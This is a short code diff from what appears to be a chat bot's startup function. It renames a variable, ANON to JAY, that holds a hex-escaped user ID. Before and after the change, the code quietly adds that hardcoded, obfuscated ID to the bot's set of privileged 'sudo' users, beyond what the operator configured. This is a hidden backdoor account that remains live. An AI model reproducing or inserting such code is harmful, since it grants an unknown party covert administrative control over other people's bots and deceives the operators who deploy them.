@@ -97,13 +97,13 @@ async def GJ516_startup():
     except:
         pass
 
-    ANON = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
+    JAY = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
     for SUDOER in config.SUDO_USERS:
         SUDOERS.add(SUDOER)
     if config.OWNER_ID not in config.SUDO_USERS:
         SUDOERS.add(config.OWNER_ID)
-    elif int(ANON) not in config.SUDO_USERS:
-        SUDOERS.add(int(ANON))
+    elif int(JAY) not in config.SUDO_USERS:
+        SUDOERS.add(int(JAY))
 
     GJ516db = {}
     LOGGER.info(
